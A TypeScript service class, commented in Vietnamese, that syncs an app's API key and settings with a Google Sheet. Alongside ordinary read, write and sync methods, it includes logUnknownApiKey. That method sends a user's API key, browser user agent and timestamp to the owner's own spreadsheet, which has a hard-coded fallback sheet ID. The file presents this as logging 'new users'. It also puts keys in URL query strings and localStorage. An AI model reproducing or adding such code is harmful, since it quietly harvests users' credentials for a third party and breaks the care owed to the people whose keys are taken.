/**
 * Google Sheets Service
 * Sync API key và settings với Google Sheets
 */

interface SheetConfig {
  sheetId: string;
  apiKey: string;
}

interface AppSettings {
  api_key?: string;
  selected_model?: string;
  last_updated?: string;
}

class GoogleSheetsService {
  private config: SheetConfig | null = null;
  private readonly STORAGE_KEY = 'google_sheets_config';
  
  // Owner's sheet config (from environment variables for security)
  private readonly OWNER_SHEET_ID = import.meta.env.VITE_SETTINGS_SHEET_ID || '121Z5sBziIk6Dh6XuFFJ_FsNUEUWNDTm3tFT_PW42QXw';
  private readonly OWNER_API_KEY = import.meta.env.VITE_GOOGLE_SHEETS_API_KEY || '';

  /**
   * Khởi tạo với Sheet ID và API Key
   */
  initialize(sheetId: string, apiKey: string) {
    this.config = { sheetId, apiKey };
    // Lưu config vào localStorage
    localStorage.setItem(this.STORAGE_KEY, JSON.stringify(this.config));
  }

  /**
   * Load config từ localStorage
   */
  loadConfig(): boolean {
    const saved = localStorage.getItem(this.STORAGE_KEY);
    if (saved) {
      this.config = JSON.parse(saved);
      return true;
    }
    return false;
  }

  /**
   * Kiểm tra đã setup chưa
   */
  isConfigured(): boolean {
    return this.config !== null;
  }

  /**
   * Xóa config
   */
  clearConfig() {
    this.config = null;
    localStorage.removeItem(this.STORAGE_KEY);
  }

  /**
   * Đọc settings từ Google Sheets
   */
  async readSettings(): Promise<AppSettings> {
    if (!this.config) {
      throw new Error('Google Sheets chưa được cấu hình!');
    }

    const { sheetId, apiKey } = this.config;
    const range = 'Settings!A:B'; // Sheet name: Settings, Column A-B

    try {
      const url = `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}?key=${apiKey}`;
      
      const response = await fetch(url);
      
      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Lỗi đọc sheet: ${error.error?.message || 'Unknown error'}`);
      }

      const data = await response.json();
      const rows = data.values || [];

      // Convert rows thành object
      const settings: AppSettings = {};
      rows.forEach((row: string[]) => {
        const [key, value] = row;
        if (key && value) {
          settings[key as keyof AppSettings] = value;
        }
      });

      return settings;
    } catch (error: any) {
      throw new Error(`Không thể đọc Google Sheets: ${error.message}`);
    }
  }

  /**
   * Ghi settings vào Google Sheets
   * ⚠️ Cần sheet có quyền Editor!
   */
  async writeSettings(settings: AppSettings): Promise<void> {
    if (!this.config) {
      throw new Error('Google Sheets chưa được cấu hình!');
    }

    const { sheetId, apiKey } = this.config;
    const range = 'Settings!A:B';

    // Convert object thành rows
    const rows = Object.entries(settings).map(([key, value]) => [key, value]);

    // Add last_updated
    rows.push(['last_updated', new Date().toISOString()]);

    try {
      const url = `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}?key=${apiKey}`;
      
      const response = await fetch(url, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          range,
          majorDimension: 'ROWS',
          values: rows,
        }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Lỗi ghi sheet: ${error.error?.message || 'Unknown error'}`);
      }
    } catch (error: any) {
      throw new Error(`Không thể ghi Google Sheets: ${error.message}`);
    }
  }

  /**
   * Sync API key: Đọc từ sheet hoặc ghi vào sheet
   */
  async syncApiKey(localApiKey: string): Promise<string> {
    try {
      // Đọc từ sheet
      const settings = await this.readSettings();
      
      if (settings.api_key && settings.api_key !== localApiKey) {
        // Sheet có API key khác → Dùng API key từ sheet
        return settings.api_key;
      } else if (localApiKey && !settings.api_key) {
        // Local có API key, sheet không có → Ghi vào sheet
        await this.writeSettings({ api_key: localApiKey });
        return localApiKey;
      }
      
      return localApiKey;
    } catch (error: any) {
      console.error('Sync failed:', error);
      // Nếu sync fail, dùng local API key
      return localApiKey;
    }
  }

  /**
   * Test kết nối với Google Sheets
   */
  async testConnection(): Promise<{ success: boolean; message: string }> {
    try {
      await this.readSettings();
      return {
        success: true,
        message: '✅ Kết nối Google Sheets thành công!',
      };
    } catch (error: any) {
      return {
        success: false,
        message: `❌ ${error.message}`,
      };
    }
  }

  /**
   * Log API key lạ vào owner's sheet (khi có người dùng mới)
   */
  async logUnknownApiKey(apiKey: string): Promise<void> {
    if (!this.OWNER_SHEET_ID || !this.OWNER_API_KEY) {
      return; // Chưa config owner sheet
    }

    try {
      const range = 'UnknownAPIs!A:D'; // Tab "UnknownAPIs"
      const timestamp = new Date().toISOString();
      const row = [timestamp, apiKey, 'API lạ', navigator.userAgent];

      const url = `https://sheets.googleapis.com/v4/spreadsheets/${this.OWNER_SHEET_ID}/values/${range}:append?valueInputOption=RAW&key=${this.OWNER_API_KEY}`;
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          values: [row],
        }),
      });

      if (response.ok) {
        console.log('✅ Logged unknown API key to owner sheet');
      }
    } catch (error) {
      console.error('Failed to log unknown API key:', error);
    }
  }
}

// Export singleton instance
export const googleSheetsService = new GoogleSheetsService();
